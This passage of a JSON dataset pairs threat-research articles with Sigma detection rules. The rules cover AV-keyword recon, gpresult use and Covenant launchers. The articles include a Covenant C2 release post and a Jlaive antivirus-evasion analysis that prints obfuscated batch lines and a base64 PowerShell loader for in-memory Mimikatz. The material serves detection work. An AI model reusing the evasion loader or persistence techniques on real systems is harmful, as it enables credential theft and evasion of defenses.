          "type": "derived"
        }
      ],
      "status": "test",
      "description": "Detects execution of \"findstr\" to search for common names of security tools. Attackers often pipe the results of recon commands such as \"tasklist\" or \"whoami\" to \"findstr\" in order to filter out the results.\nThis detection focuses on the keywords that the attacker might use as a filter.\n",
      "references": [
        "https://github.com/redcanaryco/atomic-red-team/blob/987e3ca988ae3cff4b9f6e388c139c05bf44bbb8/atomics/T1518.001/T1518.001.md#atomic-test-1---security-software-discovery",
        "https://www.microsoft.com/en-us/security/blog/2023/10/18/multiple-north-korean-threat-actors-exploiting-the-teamcity-cve-2023-42793-vulnerability/",
        "https://www.hhs.gov/sites/default/files/manage-engine-vulnerability-sector-alert-tlpclear.pdf"
      ],
      "author": "Nasreddine Bencherchali (Nextron Systems), frack113",
      "date": "2023-10-20",
      "modified": "2023-11-14",
      "tags": [
        "attack.discovery",
        "attack.t1518.001"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection_img": [
          {
            "Image|endswith": [
              "\\find.exe",
              "\\findstr.exe"
            ]
          },
          {
            "OriginalFileName": [
              "FIND.EXE",
              "FINDSTR.EXE"
            ]
          }
        ],
        "selection_cli": {
          "CommandLine|endswith": [
            " avira",
            " avira\"",
            " cb",
            " cb\"",
            " cylance",
            " cylance\"",
            " defender",
            " defender\"",
            " kaspersky",
            " kaspersky\"",
            " kes",
            " kes\"",
            " mc",
            " mc\"",
            " sec",
            " sec\"",
            " sentinel",
            " sentinel\"",
            " symantec",
            " symantec\"",
            " virus",
            " virus\""
          ]
        },
        "condition": "all of selection_*"
      },
      "falsepositives": [
        "Unknown"
      ],
      "level": "medium"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_findstr_security_keyword_lookup.yml",
    "id": "174"
  },
  {
    "url": "https://unit42.paloaltonetworks.com/emissary-trojan-changelog-did-operation-lotus-blossom-cause-it-to-evolve/",
    "markdown": "",
    "sigma_rule": {
      "title": "Gpresult Display Group Policy Information",
      "id": "e56d3073-83ff-4021-90fe-c658e0709e72",
      "status": "test",
      "description": "Detects cases in which a user uses the built-in Windows utility gpresult to display the Resultant Set of Policy (RSoP) information",
      "references": [
        "https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1615/T1615.md",
        "https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/gpresult",
        "https://unit42.paloaltonetworks.com/emissary-trojan-changelog-did-operation-lotus-blossom-cause-it-to-evolve/",
        "https://www.welivesecurity.com/wp-content/uploads/2020/05/ESET_Turla_ComRAT.pdf"
      ],
      "author": "frack113",
      "date": "2022-05-01",
      "tags": [
        "attack.discovery",
        "attack.t1615"
      ],
      "logsource": {
        "product": "windows",
        "category": "process_creation"
      },
      "detection": {
        "selection": {
          "Image|endswith": "\\gpresult.exe",
          "CommandLine|contains": [
            "/z",
            "/v"
          ]
        },
        "condition": "selection"
      },
      "falsepositives": [
        "Unknown"
      ],
      "level": "medium"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_gpresult_execution.yml",
    "id": "189"
  },
  {
    "url": "https://www.welivesecurity.com/wp-content/uploads/2020/05/ESET_Turla_ComRAT.pdf",
    "markdown": "",
    "sigma_rule": {
      "title": "Gpresult Display Group Policy Information",
      "id": "e56d3073-83ff-4021-90fe-c658e0709e72",
      "status": "test",
      "description": "Detects cases in which a user uses the built-in Windows utility gpresult to display the Resultant Set of Policy (RSoP) information",
      "references": [
        "https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1615/T1615.md",
        "https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/gpresult",
        "https://unit42.paloaltonetworks.com/emissary-trojan-changelog-did-operation-lotus-blossom-cause-it-to-evolve/",
        "https://www.welivesecurity.com/wp-content/uploads/2020/05/ESET_Turla_ComRAT.pdf"
      ],
      "author": "frack113",
      "date": "2022-05-01",
      "tags": [
        "attack.discovery",
        "attack.t1615"
      ],
      "logsource": {
        "product": "windows",
        "category": "process_creation"
      },
      "detection": {
        "selection": {
          "Image|endswith": "\\gpresult.exe",
          "CommandLine|contains": [
            "/z",
            "/v"
          ]
        },
        "condition": "selection"
      },
      "falsepositives": [
        "Unknown"
      ],
      "level": "medium"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_gpresult_execution.yml",
    "id": "190"
  },
  {
    "url": "https://posts.specterops.io/covenant-v0-5-eee0507b85ba",
    "markdown": "# Covenant v0.5\n\n## Intro\n\nCovenant v0.5 is being released today and includes a set of new features, a major UI update, and lots of bug fixes.\n\nThis will be a short post documenting some of the major feature updates.\n\n## Blazor: Front-End C#\n\nThe largest update in v0.5 is migrating the interface over to the Blazor framework. Blazor is a framework for writing client-side web interfaces in C#.\n\nPrior to Blazor, Covenant didn’t utilize any real client-side framework like React, Angular, etc. The client-side of the Web UI was written with some one-off JavaScript functions that utilized only JQuery. This made UI components difficult to scale and maintain. Since Covenant is already built on .NET Core, it made a lot of sense to use Microsoft’s new client-side framework, Blazor.\n\nI’m not particularly fond of writing JavaScript anyways, so that fact that client-side code in Blazor is written in C# made the transition even better. Beyond language preference, this allows the client-side of the application to take full advantage of the .NET Core ecosystem and libraries. We also hope that this makes the UI much more approachable to those that might be interested in making UI contributions to the project.\n\nAdditionally, Blazor transforms Covenant into a true SPA, or Single Page Application. What exactly does this mean? As a Covenant user, the first time you visit the Covenant site an HTTP request is made to pull down the initial application, and that’s it, no more HTTP requests! The rest of your interaction with the server is accomplished over real-time WebSockets.\n\nThe main difference you’ll see as a user, is pages should load a little bit faster than before, and the entire interface should update in real-time as things change on the backend server. For example, no more need to refresh the page to check for a Grunt’s new LastCheckIn time! The interface has been overhauled to take advantage of the real-time features provided by Blazor.\n\n## Brutes: The New .NET Core Implant\n\nCovenant has a brand new built-in, cross-platform implant: Brutes! Operators are no longer limited to Grunt implants or to Windows targets.\n\n```image\nAlt: Active Brutes on Windows, Linux, and MacOS Targets\nDescription: The image displays a user interface of the Covenant platform, specifically the 'Grunts' section. It lists several active implants named 'Brute' with their respective details, such as unique identifiers (UUIDs), hostnames (including 'DESKTOP-F9DQ76G', 'kali', and 'mac.attlocal.net'), usernames associated with each implant (like 'cobbr' and 'root'), their status (all marked as 'Active'), last check-in times, integrity levels (all listed as 'Medium'), and a notes column. The interface includes pagination options at the bottom.\nTranscription: |\n  | Name       | ImplantTemplate | Hostname         | UserName | Status | LastCheckIn           | Integrity | Note |\n  | ---------- | --------------- | ---------------- | -------- | ------ | --------------------- | --------- | ---- |\n  | f3545796de | Brute           | DESKTOP-F9DQ76G  | cobbr    | Active | 5/24/2020 10:45:08 PM | Medium    |      |\n  | 2e82893954 | Brute           | kali             | root     | Active | 5/24/2020 10:45:08 PM | Medium    |      |\n  | 9d9043e887 | Brute           | mac.attlocal.net | cobbr    | Active | 5/24/2020 10:45:09 PM | Medium    |      |\n```\n\nCovenant has slowly been moving towards the goal of being truly implant-agnostic, and the introduction of the Brute implant is a major step towards that goal. The concept of an implant-agnostic C2 framework has been talked about over the last few years, and was really pioneered by the Faction and Apfell frameworks. The idea is that many different implants can communicate over a common protocol dictated by the framework, and easily plug into the framework. Covenant has technically supported the implant-agnostic model for quite awhile.\n\nThe introduction of `ImplantTemplates` in v0.4 allowed operators to easily modify and create new C# implants and was an initial step towards making implant creation more accessible to developers. With the introduction of Brutes, Covenant now has an implant that is written in C#, but **not** based on the .NET Framework at all. The implant is fully supported and built-in to the platform.\n\nAs Covenant continues to make steps towards the implant-agnostic model, I’d encourage operators and developers to try their hand at modifying existing implants for their needs, or creating their own personal implant!\n\nThe Brute implant itself is fairly simple, there isn’t a huge library of available tasks quite yet, but some of the most important tasks are available: `shell`, `ps`, `ls`, `assembly`, and a handful of others. The Brute implant shares a large percentage of its codebase with Grunts, with some minor changes to port the code over to .NET Core, but there’s not many libraries to borrow tasks from available in .NET Core like there is for the .NET Framework, such as SharpSploit and GhostPack.\n\nThere’s a lot to say about the potential of .NET Core implants, and I plan to release a follow-up post on .NET Core malware in the near future. I’ll leave most of those details for that post. For now, it’s enough to say that Brutes are cross-platform .NET Core implants with a limited set of base functionality.\n\n## Shareable Tasks\n\nTasks can now be easily imported and exported to or from a running Covenant instance as YAML files. This makes it much easier to share your Covenant tasks with others that may be interested in your work.\n\nIt also makes it much easier to contribute built-in Tasks to the project. Before this change, built-in Tasks were described programmatically in Covenant’s source code, and required source code changes to add new built-in Tasks. Now, YAML files included under the `Data\\Tasks` directory will automatically be parsed and imported when Covenant first starts up. Additional tasks that you would like to use can be imported within the interface.\n\n```image\nAlt: Import Tasks through the UI\nDescription: The image displays a user interface for the Covenant tool, specifically focusing on the 'Import GruntTask(s)' feature. It includes a modal window where users can choose a file to import custom tasks. The background features a table of existing tasks, showing their names, compatible .NET versions, reference source libraries, and descriptions of their functionalities. Some examples of tasks listed are 'PersistStartup', 'BypassAmsi', and 'Rubeus', indicating their purpose in executing payloads and performing persistence actions.\nTranscription: |\n  | Name             | CompatibleDotNetVersions | ReferenceSourceLibraries | Description                                                                                                                                                                                                                   |\n  |------------------|--------------------------|--------------------------|-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------|\n  | PersistStartup   | Net35, Net40             | SharpSploit              | Installs a payload into the current users startup folder. Payload: Payload to write to a file. E.g. \"powershell -Sta -Nop -Window Hidden -EncodedCommand <blah>\": FileName: Name of the file to write. E.g. \"startup.bat\".    |\n  | PersistCOMHijack | Net35, Net40             |                          | Uses a registry key to execute a payload for persistence.                                                                                                                                                                     |\n  | PersistWMI       | Net35, Net40             |                          | Uses WMI event, Consumer and Binding to execute a payload.                                                                                                                                                                    |\n  | PersistAutorun   | Net35, Net40             |                          | Sets a registry value in HKCU or HKLM to execute a payload. Specify \"CurrentUser\" for HKCU or \"Machine\" for HKLM. Value: Value to set in the registry. Example|GruntStager.exe\" Name: Name for the registry value. \"Updater\". |\n  | BypassAmsi       | Net35, Net40             | SharpSploit              | Bypasses AMSI by patching the AmsiScanBuffer function.                                                                                                                                                                        |\n  | Rubeus           | Net35, Net40             | Rubeus                   | Use a rubeus command.                                                                                                                                                                                                         |\n  | SharpDPAPI       | Net35, Net40             | SharpDPAPI               | Use a SharpDPAPI command.                                                                                                                                                                                                     |\n  | SharpUp          | Net35, Net40             | SharpUp                  | Use a SharpUp command.                                                                                                                                                                                                        |\n  | SharpDump        | Net35, Net40             | SharpDump                | Use a SharpDump command.                                                                                                                                                                                                      |\n  | Seatbelt         | Net35, Net40             | Seatbelt                 | Use a Seatbelt command.                                                                                                                                                                                                       |\n  \n  Import GruntTask(s)\n  Choose File: No file chosen\n  [Import] [Cancel]\n```\n\nHopefully, this makes it much easier to share custom Tasks or to maintain your own libraries of custom Tasks.\n\n## Other Minor Updates\n\nThere are many more updates and fixes in this release than we are able to mention here, but here’s a few other minor updates you’ll find in v0.5:\n\n- **Author Information** — Author information is included in GruntTasks, so you’ll get credit for the Tasks you contribute to Covenant.\n- **Hide and Unhide Grunts** — The ability to hide and unhide Grunts has been reworked, so you can easily hide and unhide old Grunts that are no longer in use from the UI.\n- **Manual Data Creation** — Credentials and Indicators can be manually added to the schema now, instead of just relying on Covenant’s automatic detection of new data.\n- **Updated ReferenceSourceLibraries** — ReferenceSourceLibraries such as SharpSploit and GhostPack have been brought up to date with the public versions.\n\n## Conclusion\n\nHopefully this has given you a brief summary of some of the major updates in the new v0.5 Covenant update. This has been the first major Covenant update in nearly 7 months, as the UI conversion over to Blazor took much more work than anticipated. Hopefully it’s been worth the wait!\n\nIn the future, we hope that Covenant updates will be much more frequent and incremental, to decrease the waiting time between updates. In the near term future, Covenant has developed quite a backlog of issues and pull requests that need to be addressed, and we likely will be focused on those and any new issues that arise from the new release. Also be on the lookout for an upcoming post on .NET Core malware for additional information related to the Brute implant.",
    "sigma_rule": {
      "title": "HackTool - Covenant PowerShell Launcher",
      "id": "c260b6db-48ba-4b4a-a76f-2f67644e99d2",
      "status": "test",
      "description": "Detects suspicious command lines used in Covenant luanchers",
      "references": [
        "https://posts.specterops.io/covenant-v0-5-eee0507b85ba"
      ],
      "author": "Florian Roth (Nextron Systems), Jonhnathan Ribeiro, oscd.community",
      "date": "2020-06-04",
      "modified": "2023-02-21",
      "tags": [
        "attack.execution",
        "attack.defense-evasion",
        "attack.t1059.001",
        "attack.t1564.003"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection_1": {
          "CommandLine|contains|all": [
            "-Sta",
            "-Nop",
            "-Window",
            "Hidden"
          ],
          "CommandLine|contains": [
            "-Command",
            "-EncodedCommand"
          ]
        },
        "selection_2": {
          "CommandLine|contains": [
            "sv o (New-Object IO.MemorySteam);sv d ",
            "mshta file.hta",
            "GruntHTTP",
            "-EncodedCommand cwB2ACAAbwAgA"
          ]
        },
        "condition": "1 of selection_*"
      },
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_hktl_covenant.yml",
    "id": "203"
  },
  {
    "url": "https://jstnk9.github.io/jstnk9/research/Jlaive-Antivirus-Evasion-Tool",
    "markdown": "# Using Jlaive to create batch files from .NET assemblies for defense evasion\n\n**May 24, 2022**\n\n## Summary\n\nJlaive is a project created to evade antivirus by creating batch files from .NET assemblies. The way it does it is very interesting and gives a new window of opportunities to actors to evade defenses and execute their payloads.\n\nYou can find the project on their official GitHub:\nhttps://github.com/ch2sh/Jlaive\n\n## Creating the batch file with Jlaive\n\nIn order to test the operation and the different events generated by this tool on a system, batch files must first be generated. The project currently provides two ways to do this.\n\n- Using the CLI file: Jlaive-CLI\n- Using the GUI: Jlaive\n\nTo test the behavior of the generated batch file, we are going to use an assembly from a known GitHub project that aims to load Mimikatz in memory through an injection.\n\nThe configuration used in Jlaive to create the batch file was as follows.\n\n```image\nAlt: configuration-jlaive\nDescription: The image depicts a graphical user interface (GUI) of the Jlaive tool used for creating batch files from .NET assemblies. It shows a window with a file path input field directing to a specific executable file (`code.exe`) located on the desktop. Below the file path, there are several checkboxes labeled 'Bypass AMSI', 'Anti Debug', 'Obfuscate', 'Self delete', 'Hidden', and 'Startup', indicating various options that can be selected to customize the batch file's behavior. A 'Build' button is present at the bottom, which likely initiates the batch file creation process.\nTranscription: |\n  File path:\n  C:\\Users\\ab\\Desktop\\code.exe\n  \n  [ ] Bypass AMSI\n  [ ] Self delete\n  [ ] Anti Debug\n  [ ] Hidden\n  [ ] Obfuscate\n  [ ] Startup\n  \n  [ Build ]\n```\n\n## Executing the assembly (Mimikatz batch file)\n\nFor this case, the .NET assembly used is KatzNetAssembly, which can be found in their GitHub\nhttps://github.com/med0x2e/NET-Assembly-Inject-Remote.\n\nWhen Jlaive is used to generate the batch file, the result is the expected .bat file. Looking at the contents of the .bat file in this case, we can see something like the following image.\n\n```image\nAlt: codemimi\nDescription: The image shows a snippet of a batch file (.bat) that is generated for executing a .NET assembly, specifically related to Mimikatz. The code includes various commands and settings used to configure the execution environment for the Mimikatz tool. It employs Windows PowerShell and includes obfuscated strings, likely intended for evading detection by antivirus solutions.\nTranscription: |\n  @echo off\n  echo F|xcopy C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe \"%~dp0%~nx0.exe\" /y\n  attrib +s +h \"%~dp0%~nx0.exe\"\n  cls\n  cd %~dp0\n  set \"ruZCmitMUS=nIdwG9yLiR\"\n  set \"DKoiKjemb=@Definition\" && set \"TNAeHADjKj=oint.Invok\"\n  set \"ZvaAmABFg=IhNYyR\" && set \"bDcwDneejM=gh\"\n  set \"CRFJSkveK=JZxPGrd\" && set \"okmIdyQPNES=c2t8URGlk\"\n  set \"BmlPYkXGYM=\" && set \"ovHEZJBrkg=TdHJlVwgb\"\n  set \"gABTyHUUq=SB9'))Add\"\n  set \"xHkWFkuyS=System.Com\"\n  set \"vBXNjqbsLE=$(null, (\" && set \"IfduFpgCku=XB0B3iPgSB\"\n  set \"GxMQPyXEG=|UTF8.G\" && set \"dAdwCQpF=flOctl.Le\"\n  set \"xmCzkXs7K=I7hZkHbc\" && set \"smktkVnUG=GspBXD8A\"\n  set \"OITXJIWE=HAyA9I5dYg\"\n  set \"JIBCRoNIV=Kaw5nTgkz\"\n  set \"SMDxOwpKYg=ZlLhBzRkg\"\n  set \"wQHIVjWE=J6OaXk96A\"\n  set \"JCmQjMAY=0~nx0.exe\"\n  set \"SJuGSqltiK=FromBase\"\n  set \"HSCJXJNdW=NiSgNusW\"\n  set \"LnlkIVeU=28P8SuZkX\"\n  set \"saySPrdMn=GZZSgB0\"\n  set \"MINFESrJ=Gg\"\n  set \"X0UrJqqAd=QWmHsbT\"\n  set \"XPrVerTe=K9Zg7EJHcI\"\n  set \"XvPrTeqKd=Convert\"\n  set \"doggBzRkiN=XnPId0gbmV\" && set \"mHWQDcJRe=Re-Type -Typ\"\n  set \"VxQEbwlTji=vert]::Fro\"\n  set \"wQPBduECZY=)).EntryP\" && set \"AVrpbRVNEN=yZXR1cm4g\"\n  set \"FAG\"\n```\n\nAs a test, I uploaded to VirusTotal both the original KatzNetAssembly binary and the generated batch file to check that vendors detected both as malicious, since Mimikatz is considered malicious by the vast majority of vendors.\n\nFirst, the KatzNetAssembly binary was detected by 43 different engines.\n\n```image\nAlt: katz_vt\nDescription: The image displays a VirusTotal report for the KatzNetAssembly executable file, showing that 43 out of 68 security vendors flagged it as malicious. It includes details such as the file's hash, size, and the specific detections from various antivirus engines. Each vendor's analysis is listed, indicating the nature of the threat detected, such as 'Trojan' or 'Suspicious.' The overall community score is displayed alongside a visual representation of the detection statistics.\nTranscription: |\n  43 security vendors and 1 sandbox flagged this file as malicious\n  \n  08c49ae3f105565c503a29ed11fb0dcc929e49dae65b7e53dac5547010562e64\n  KatzNetAssembly.exe\n  64bits\n  detect-debug-environment\n  direct-cpu-clock-access\n  peexe\n  runtime-modules\n  spreader\n  \n  Security Vendors' Analysis\n  Acronis (Static ML)                     Suspicious\n  AhnLab-V3                               Trojan:Win32.Kryptik.C4152199\n  ALYac                                   Gen:Variant.Cerbu.133322\n  AVG                                     Win64:Trojan-gen\n  BitDefender                             Gen:Variant.Cerbu.133322\n  CrowdStrike Falcon                      Win/malicious_confidence_100%\n  Ad-Aware                                Gen:Variant.Cerbu.133322\n  Alibaba                                 Trojan:MSIL/Kryptik.caa3a136\n  Avast                                   Win64:Trojan-gen\n  Avira (no cloud)                        HEUR/AGEN.1208647\n  Comodo                                  Malware@#qf71l2zzchig\n  Cylance                                 Unsafe\n```\n\nIn contrast, the batch file generated above was not detected by any of them.\n\n```image\nAlt: katzbatch_vt\nDescription: The image displays a VirusTotal analysis report for a batch file named 'KatzNetAssembly.bat'. It indicates that no security vendors (0 out of 58) flagged this file as malicious, highlighting a community score and details about the file's detection. The report includes sections for Detection, Details, Relations, Behavior, and Community, with a list of various security vendors and their analysis results, all marked as 'Undetected'.\nTranscription: |\n  f757d1945836ed49ac2397298b5da43cd5d408d8bc3f1d7fd81e0a1a2855467\n  KatzNetAssembly.bat\n  direct-cpu-clock-access\n  \n  No security vendors and no sandboxes flagged this file as malicious\n  \n  Security Vendors' Analysis\n  Acronis (Static ML)         Undetected\n  AhnLab-V3                   Undetected\n  Antiy-AVL                   Undetected\n  Avast                       Undetected\n  Baidu                       Undetected\n  BitDefenderTheta            Undetected\n  Ad-Aware                    Undetected\n  ALYac                       Undetected\n  Arcabit                     Undetected\n  Avira (no cloud)            Undetected\n  BitDefender                 Undetected\n  Bkav Pro                    Undetected\n```\n\nAs soon as the .bat file is executed, you can see how Mimikatz is loaded for use by the user.\n\n```image\nAlt: Mimikatzrunning\nDescription: The image shows a split-screen view of a command line interface and a process explorer. On the left side, the command line interface is running Mimikatz, displaying the output of a hashing operation with various cryptographic hashes (NTLM, LM, MD5, SHA1, SHA2). On the right side, a process explorer is listing active processes in the system, with a highlight on 'KatzNetAssembly.bat.exe', indicating it is currently running. This visual representation illustrates the execution of the batch file generated from the .NET assembly in a cybersecurity context.\nTranscription: |\n  mimikatz # crypto::hash\n  NTLM:  31d6cfe0d16ae931b73c59d7e0c089c0\n  LM:    aad34b435b5140eeaadab435b51404ee\n  MD5:   d41d8cd98f00b204e9800998ecf8427e\n  SHA1:  da39a3ee5e6b4b0d3255bf95601899afd80709\n  SHA2:  e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855\n  mimikatz #\n```\n\n### High level processes events\n\nWhen the batch file is executed, different events take place in the operating system, ranging from the creation of temporary files to be used (for compilation purposes) to the copying of the legitimate powershell binary. The following image is a high-level visualization of the events that occur in the operating system.\n\n```image\nAlt: processes_events\nDescription: The image is a detailed flowchart illustrating high-level processes and events that occur in the operating system when a batch file created from a .NET assembly (specifically Mimikatz) is executed. It visually represents various components such as files, processes, threads, and registry keys, indicated by different colored lines and text boxes. The flowchart includes connections and interactions between these components, capturing the complexity of the events related to the execution of the batch file. The overall quality of the image is described as not optimal, but it still serves as a useful visualization for understanding the processes involved.\nTranscription: |\n  [Process Events Visualization]\n  - Yellow Boxes: Events related to file creation and manipulation\n  - Pink Lines: Indicate process creation and execution\n  - Green Lines: Represent registry key modifications\n  - Black Lines: Show data flow between processes\n  - Orange Boxes: Indicate legitimate binaries being accessed or copied\n  - Diamond Shapes: Decision points in the execution flow\n```\n\nThe quality of the image is not the best (procdot pls :D), but it is useful to see at a high level all the events that happen related to files, processes, threads, registry keys, etc. In the following sections we will go in detail in the most important events of the previous image.\n\n### Genealogy\n\nTaking a look at the process genealogy generated after the execution, we can see the following activity that took place when we executed the batch file:\n\n```image\nAlt: genealogy\nDescription: The image captures a process genealogy tree that outlines the execution sequence of various processes initiated by a batch file related to Mimikatz. It displays the names of processes such as 'cmd.exe', 'Conhost.exe', 'xcopy.exe', 'attrb.exe', and 'KatzNetAssembly.bat.exe', along with their corresponding command lines and paths. The genealogy illustrates how these processes are linked and executed in a hierarchical manner, indicating which processes are parent and child processes during the execution.\nTranscription: |\n  cmd.exe (2980)\n      Windows Command Processor\n      C:\\Windows\\system32\\cmd.exe\n  \n  Conhost.exe (1748)\n      Console Window Host\n      C:\\Windows\\system32\\Conhost.exe\n  \n  cmd.exe (9420)\n      Windows Command Processor\n      C:\\Windows\\system32\\cmd.exe\n  \n  xcopy.exe (10188)\n      Extended Copy Utility\n      C:\\Windows\\system32\\xcopy.exe\n  \n  attrib.exe (3672)\n      Attribute Utility\n      C:\\Windows\\system32\\attrib.exe\n  \n  KatzNetAssembly.bat.exe (1)\n      Windows PowerShell\n      C:\\Users\\lab\\Desktop\\mini\\NET-Assembly-Inject-Remote-master\\VK...\n  \n  csc.exe (5952)\n      Visual C# Compiler\n      C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\csc.exe\n  \n  cvtrex.exe (9520)\n      Microsoft® Resource...\n      C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\cvtrex.exe\n```\n\nFrom top to bottom, the processes with their corresponding command lines that are launched during execution are as follows.\n\n### cmd.exe - 2980\n\n```\nC:\\Windows\\system32\\cmd.exe /c \"\"C:\\Users\\lab\\Desktop\\mimi\\NET-Assembly-Inject-Remote-master\\KatzNetAssembly\\bin\\Debug\\KatzNetAssembly.bat\" \"\n```\n\nThis is the initial execution of the batch file. From this point on, the auto-generated batch file performs different actions on the system when it is executed.\n\n### cmd.exe - 9420\n\n```\nC:\\Windows\\system32\\cmd.exe  /S /D /c\" echo F\"\n```\n\nThis process does not perform any particular action. This is because in the first lines of the batch file the following information can be observed.\n\n```image\nAlt: twocommands\nDescription: The image displays a snippet of a batch file script related to defense evasion techniques using Jlaive. The script lines indicate the use of the `echo F` command and the `xcopy` command to execute PowerShell. The first line `@echo off` suppresses command output. The second line contains the `echo F` command, which will simply output 'F', followed by an `xcopy` command that aims to copy a PowerShell executable file. The highlighted lines provide a focused view of how commands are structured in the script.\nTranscription: |\n  @echo off\n  echo F|xcopy C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe \"%~dp0%~nx0.exe\" /y\n```\n\nLine 2 of the previous image shows how the `|` character exists without being escaped by `^`. Therefore, the first part before the `|` character will be launched as a new process that will simply do a `echo F` (this same cmd.exe process with PID 9420), and the second part after the `|` character will be the execution of a new process called by `xcopy.exe`, which we will see its purpose below.\n\n### xcopy.exe - 10188\n\n```\nxcopy  C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe \"C:\\Users\\lab\\Desktop\\mimi\\NET-Assembly-Inject-Remote-master\\KatzNetAssembly\\bin\\Debug\\KatzNetAssembly.bat.exe\" /y\n```\n\nXcopy is a Microsoft Windows binary that can be used to copy files and directories. In this case, the copy that is made is `powershell.exe` with the same name as the initial batch file, leaving finally in this case the name `KatzNetAssembly.bat.exe`.\n\n```image\nAlt: writefilesxcopy\nDescription: The image displays a table detailing the execution of the 'xcopy.exe' process. It includes columns for Process Name, PID (Process ID), Parent PID, Operation, Path, Result, and Detail. The operations performed by 'xcopy.exe' are logged as 'WriteFile' actions, indicating that files are being written to a specific path on the user's desktop. The results of these operations are all marked as 'SUCCESS,' and the 'Detail' column provides additional information about the offsets and lengths of the written data.\nTranscription: |\n  Process Name   PID    Parent...   Operation    Path                                                                                                            Result   Detail\n  xcopy.exe      10188  2980        WriteFile    C:\\Users\\lab\\Desktop\\mimi\\NET-Assembly-Inject-Remote-master\\KatzNetAssembly\\bin\\Debug\\KatzNetAssembly.bat.exe   SUCCESS  Offset 0, Length: 131.072, Priority: Normal\n  xcopy.exe      10188  2980        WriteFile    C:\\Users\\lab\\Desktop\\mimi\\NET-Assembly-Inject-Remote-master\\KatzNetAssembly\\bin\\Debug\\KatzNetAssembly.bat.exe   SUCCESS  Offset 131.072, Length: 131.072\n  xcopy.exe      10188  2980        WriteFile    C:\\Users\\lab\\Desktop\\mimi\\NET-Assembly-Inject-Remote-master\\KatzNetAssembly\\bin\\Debug\\KatzNetAssembly.bat.exe   SUCCESS  Offset 262.144, Length: 131.072\n  xcopy.exe      10188  2980        WriteFile    C:\\Users\\lab\\Desktop\\mimi\\NET-Assembly-Inject-Remote-master\\KatzNetAssembly\\bin\\Debug\\KatzNetAssembly.bat.exe   SUCCESS  Offset 393.216, Length: 54.784\n```\n\n### attrib.exe - 3672\n\n```\nattrib  +s +h \"C:\\Users\\lab\\Desktop\\mimi\\NET-Assembly-Inject-Remote-master\\KatzNetAssembly\\bin\\Debug\\KatzNetAssembly.bat.exe\"\n```\n\n`attrib` is another Microsoft Windows utility. It is used in this case to set attributes assigned to the newly copied file.\n\n- +s: Sets the System file attribute.\n- +h: Sets the Hidden file attribute.\n\n### KatzNetAssembly.bat.exe - 8576\n\n```\nKatzNetAssembly.bat.exe  -noprofile  -executionpolicy bypass -command $FlOctL = [System.IO.File]::ReadAllText('C:\\Users\\lab\\Desktop\\mimi\\NET-Assembly-Inject-Remote-master\\KatzNetAssembly\\bin\\Debug\\KatzNetAssembly.bat').Split([Environment]::NewLine);$hUtefJ = $FlOctL[$FlOctL.Length - 1];$kADuSQ = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('dXNpbmcgU3lzdGVtLlRleHQ7dXNpbmcgU3lzdGVtLklPO3VzaW5nIFN5c3RlbS5JTy5Db21wcmVzc2lvbjt1c2luZyBTeXN0ZW0uU2VjdXJpdHkuQ3J5cHRvZ3JhcGh5OyBwdWJsaWMgY2xhc3Mgc2t2Z1pSIHsgcHVibGljIHN0YXRpYyBieXRlW10geVhMZVdlKGJ5dGVbXSBpbnB1dCwgYnl0ZVtdIGtleSwgYnl0ZVtdIGl2KSB7IEFlc01hbmFnZWQgYWVzID0gbmV3IEFlc01hbmFnZWQoKTsgYWVzLk1vZGUgPSBDaXBoZXJNb2RlLkNCQzsgYWVzLlBhZGRpbmcgPSBQYWRkaW5nTW9kZS5QS0NTNzsgSUNyeXB0b1RyYW5zZm9ybSBkZWNyeXB0b3IgPSBhZXMuQ3JlYXRlRGVjcnlwdG9yKGtleSwgaXYpOyBieXRlW10gZGVjcnlwdGVkID0gZGVjcnlwdG9yLlRyYW5zZm9ybUZpbmFsQmxvY2soaW5wdXQsIDAsIGlucHV0Lkxlbmd0aCk7IGRlY3J5cHRvci5EaXNwb3NlKCk7IGFlcy5EaXNwb3NlKCk7IHJldHVybiBkZWNyeXB0ZWQ7IH0gcHVibGljIHN0YXRpYyBieXRlW10geFpQcEdaKGJ5dGVbXSBieXRlcykgeyBNZW1vcnlTdHJlYW0gbXNpID0gbmV3IE1lbW9yeVN0cmVhbShieXRlcyk7IE1lbW9yeVN0cmVhbCBtc28gPSBuZXcgTWVtb3J5U3RyZWFtKCk7IHZhciBncyA9IG5ldyBHWmlwU3RyZWFtKG1zaSwgQ29tcHJlc3Npb25Nb2RlLkRlY29tcHJlc3MpOyBncy5Db3B5VG8obXNvKTsgZ3MuRGlzcG9zZSgpOyBtc2kuRGlzcG9zZSgpOyBtc28uRGlzcG9zZSgpOyByZXR1cm4gbXNvLlRvQXJyYXkoKTsgfSB9'))\n```\n\nThe `KatzNetAssembly.bat.exe` file is actually `PowerShell.exe`, which in this case is executed through a series of parameters and a command through `-command`, where it first reads the batch file information and then loads the assembly in memory to run Mimikatz.\n\nThis is achieved by the `Add-Type` cmdlet which adds the .NET class to the `PowerShell` session and with the help of `System.Reflection.Assembly::Load` the payload is loaded into memory.\n\nWhen these processes are executed to perform such compilations, it is important to know that there are a series of temporary files that are generated in the system. In this case, we will focus a little more on the files named `wzpaloqi.0.cs` and `wzpaloqi.cmdline`. The latter will be used later by `csc.exe` which contains addresses to compile the 